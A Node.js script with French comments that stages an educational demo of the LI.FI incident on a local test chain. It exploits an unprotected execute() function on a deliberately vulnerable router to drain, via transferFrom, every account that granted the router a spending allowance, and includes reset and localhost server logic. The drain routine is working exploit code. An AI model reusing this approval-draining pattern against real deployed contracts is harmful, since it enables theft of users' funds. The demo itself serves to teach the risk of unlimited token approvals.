// « On pirate le site. » Exploite la FAILLE du VulnerableRouter (execute() non protégée) pour
// vider, par transferFrom, tous les comptes qui ont laissé un droit de dépense à ce routeur.
// Scène LI.FI : le service était honnête, il est compromis ; ce qu'on lui a laissé le droit de
// prendre est perdu ce jour-là. Un droit illimité => tout le solde part. Un droit limité déjà
// consommé par l'échange => rien à prendre.
//
//   node pirater.mjs --network local                 (pirate une fois, affiche avant/après)
//   node pirater.mjs --network local --reset          (remet la scène à zéro)
//   node pirater.mjs --network local --serve          (127.0.0.1:8611 : POST /pirater, POST /reset, GET /state)
//
// SÉCURITÉ : chaîne locale uniquement (makeContext impose rpcUrl = 127.0.0.1 pour kind "local").
// --reset n'existe que sur la chaîne locale (impersonation). Aucun système réel, aucune donnée réelle.
import http from "node:http";
import path from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import {
  ethers,
  ERC20_ABI,
  DEAD,
  makeContext,
  attackerSigner,
  asImpersonated,
  setLocalBalance,
  parseNetwork,
} from "./lib.mjs";

const PORT = Number(process.env.HOLDUP_PIRATE_PORT || 8611);
const ALLOWED_ORIGINS = new Set([
  "http://localhost:8793", "http://127.0.0.1:8793",
  "http://localhost:8791", "http://127.0.0.1:8791",
]);
const ALLOWED_HOSTS = new Set([`127.0.0.1:${PORT}`, `localhost:${PORT}`]);

const VULN_ROUTER_ABI = [
  "function execute(address target,bytes data) returns (bytes)",
  "event Exploited(address indexed caller, address indexed target)",
];
const TRANSFER_FROM = new ethers.Interface(["function transferFrom(address,address,uint256)"]);
const f6 = (v) => ethers.formatUnits(v, 6);
const MAX = ethers.MaxUint256;

function vulnRouterOf(addresses) {
  const a = addresses.vulnRouter;
  if (!a || !ethers.isAddress(a)) {
    throw new Error("addresses.local.json ne contient pas vulnRouter. Redeploie : cd blockchain && npm run demo:deploy -- --network localhost");
  }
  return ethers.getAddress(a);
}

// Tous les comptes qui ont accordé un droit de dépense au routeur vulnérable (événements Approval du jeton).
async function grantingAccounts(ctx, vulnRouter) {
  const { provider, addresses } = ctx;
  const usdc = new ethers.Contract(addresses.usdc, [
    "event Approval(address indexed owner, address indexed spender, uint256 value)",
  ], provider);
  const from = Math.max(0, (addresses.blockNumber || 1) - 1);
  let logs = [];
  try {
    logs = await usdc.queryFilter(usdc.filters.Approval(null, vulnRouter), from);
  } catch { logs = []; }
  const owners = new Set();
  for (const l of logs) owners.add(ethers.getAddress(l.args.owner));
  // Le compte de démo est toujours considéré, même sans log retrouvé.
  if (addresses.victim && ethers.isAddress(addresses.victim)) owners.add(ethers.getAddress(addresses.victim));
  return [...owners];
}

async function snapshot(ctx, vulnRouter, owners) {
  const { provider, addresses } = ctx;
  const usdc = new ethers.Contract(addresses.usdc, ERC20_ABI, provider);
  const rows = [];
  for (const o of owners) {
    const [bal, allo] = await Promise.all([usdc.balanceOf(o), usdc.allowance(o, vulnRouter)]);
    rows.push({ account: o, balance: bal.toString(), allowance: allo.toString(), allowanceUnlimited: allo >= 2n ** 128n });
  }
  const collector = await usdc.balanceOf(addresses.collector);
  return { accounts: rows, collector: collector.toString() };
}

// Le geste du pirate : pour chaque compte, prendre min(droit, solde) via la faille du routeur.
export async function pirater(ctx) {
  const { provider, addresses } = ctx;
  const vulnRouter = vulnRouterOf(addresses);
  const usdc = new ethers.Contract(addresses.usdc, ERC20_ABI, provider);
  const owners = await grantingAccounts(ctx, vulnRouter);
  const before = await snapshot(ctx, vulnRouter, owners);

  const signer = await attackerSigner(ctx); // compte « pirate » (collector), débloqué sur le nœud local
  const router = new ethers.Contract(vulnRouter, VULN_ROUTER_ABI, signer);
  const taken = [];
  for (const o of owners) {
    const [allo, bal] = await Promise.all([usdc.allowance(o, vulnRouter), usdc.balanceOf(o)]);
    const amount = allo < bal ? allo : bal; // ce que le droit permet réellement de prendre
    if (amount <= 0n) { taken.push({ account: o, taken: "0", reason: allo === 0n ? "aucun droit restant" : "solde nul" }); continue; }
    const data = TRANSFER_FROM.encodeFunctionData("transferFrom", [o, addresses.collector, amount]);
    try {
      await (await router.execute(addresses.usdc, data)).wait();
      taken.push({ account: o, taken: amount.toString() });
    } catch (e) {
      taken.push({ account: o, taken: "0", reason: (e.shortMessage || e.reason || e.message || "échec").slice(0, 80) });
    }
  }
  const after = await snapshot(ctx, vulnRouter, owners);
  const total = taken.reduce((s, t) => s + BigInt(t.taken), 0n);
  return { vulnRouter, collector: addresses.collector, victim: addresses.victim, owners, taken, total: total.toString(), before, after, at: new Date().toISOString() };
}

// Remise à zéro de la scène (chaîne locale uniquement) : on révoque les droits donnés au routeur
// vulnérable et on renvoie le butin du pirate aux comptes vidés, de sorte que la scène se rejoue.
export async function reset(ctx) {
  if (!ctx.isLocal) throw new Error("La remise à zéro n'existe que sur la chaîne locale.");
  const { provider, addresses } = ctx;
  const vulnRouter = vulnRouterOf(addresses);
  const usdc = new ethers.Contract(addresses.usdc, ERC20_ABI, provider);
  const owners = await grantingAccounts(ctx, vulnRouter);

  // 1) révoquer le droit de chaque compte au routeur vulnérable.
  for (const o of owners) {
    const allo = await usdc.allowance(o, vulnRouter);
    if (allo > 0n) {
      await asImpersonated(provider, o, async (s) => { await (await usdc.connect(s).approve(vulnRouter, 0n)).wait(); });
    }
  }
  // 2) renvoyer le butin du pirate au compte de démo (undo du vol pour pouvoir rejouer).
  const loot = await usdc.balanceOf(addresses.collector);
  if (loot > 0n && addresses.victim && ethers.isAddress(addresses.victim)) {
    await setLocalBalance(provider, addresses.collector, 10n);
    await asImpersonated(provider, addresses.collector, async (s) => {
      await (await usdc.connect(s).transfer(addresses.victim, loot)).wait();
    });
  }
  return { vulnRouter, collector: addresses.collector, victim: addresses.victim, restored: loot.toString(), owners, state: await snapshot(ctx, vulnRouter, owners), at: new Date().toISOString() };
}

export async function stateOf(ctx) {
  const vulnRouter = vulnRouterOf(ctx.addresses);
  const owners = await grantingAccounts(ctx, vulnRouter);
  return {
    chainId: ctx.addresses.chainId, rpcUrl: ctx.addresses.rpcUrl,
    usdc: ctx.addresses.usdc, vulnRouter, collector: ctx.addresses.collector, victim: ctx.addresses.victim,
    state: await snapshot(ctx, vulnRouter, owners),
  };
}

function printResult(res) {
  console.log(`routeur vulnérable  ${res.vulnRouter}`);
  console.log(`pirate (collector)  ${res.collector}`);
  for (const t of res.taken) {
    console.log(`  ${t.account}  pris ${f6(t.taken)} DUSDC${t.reason ? "  (" + t.reason + ")" : ""}`);
  }
  console.log(`total pris          ${f6(res.total)} DUSDC`);
  const v = (snap, who) => { const r = snap.accounts.find((x) => x.account.toLowerCase() === String(who).toLowerCase()); return r ? f6(r.balance) : "?"; };
  console.log(`compte de démo      ${v(res.before, res.victim)} -> ${v(res.after, res.victim)} DUSDC`);
  console.log(`pirate              ${f6(res.before.collector)} -> ${f6(res.after.collector)} DUSDC`);
}

function serve(ctx) {
  const send = (res, code, body, origin) => {
    const h = { "content-type": "application/json" };
    if (origin && ALLOWED_ORIGINS.has(origin)) { h["access-control-allow-origin"] = origin; h["vary"] = "Origin"; }
    res.writeHead(code, h); res.end(JSON.stringify(body));
  };
  const server = http.createServer(async (req, res) => {
    const origin = req.headers.origin;
    try {
      if (!ALLOWED_HOSTS.has(req.headers.host || "")) return send(res, 403, { error: "bad Host" });
      if (origin && !ALLOWED_ORIGINS.has(origin)) return send(res, 403, { error: "origin not allowed" });
      if (req.method === "OPTIONS") {
        res.writeHead(204, { "access-control-allow-origin": origin || "", "access-control-allow-methods": "GET, POST, OPTIONS", "access-control-allow-headers": "content-type", "access-control-max-age": "600", vary: "Origin" });
        return res.end();
      }
      if (req.method === "GET" && req.url === "/state") return send(res, 200, await stateOf(ctx), origin);
      if (req.method === "POST" && req.url === "/pirater") return send(res, 200, await pirater(ctx), origin);
      if (req.method === "POST" && req.url === "/reset") return send(res, 200, await reset(ctx), origin);
      return send(res, 404, { error: "not found" }, origin);
    } catch (e) { return send(res, 500, { error: e.message }, origin); }
  });
  server.listen(PORT, "127.0.0.1", () => {
    console.log(`serveur pirate sur http://127.0.0.1:${PORT}  (POST /pirater, POST /reset, GET /state)  chaîne ${ctx.addresses.chainId}`);
  });
  return server;
}

function parseArgs(argv) { const o = {}; for (let i = 0; i < argv.length; i++) { const a = argv[i]; if (a === "--serve" || a === "--reset") o[a.slice(2)] = true; else if (a.startsWith("--")) o[a.slice(2)] = argv[++i]; } return o; }

async function main() {
  const args = parseArgs(process.argv.slice(2));
  const kind = parseNetwork(process.argv.slice(2));
  const ctx = await makeContext(kind);
  if (args.serve) return serve(ctx);
  if (args.reset) { const r = await reset(ctx); console.log(`remis à zéro : ${f6(r.restored)} DUSDC rendus, droits révoqués.`); return process.exit(0); }
  printResult(await pirater(ctx));
  process.exit(0);
}

if (process.argv[1] && import.meta.url === pathToFileURL(path.resolve(process.argv[1])).href) {
  main().catch((e) => { console.error("Erreur:", e.message || e); process.exit(1); });
}
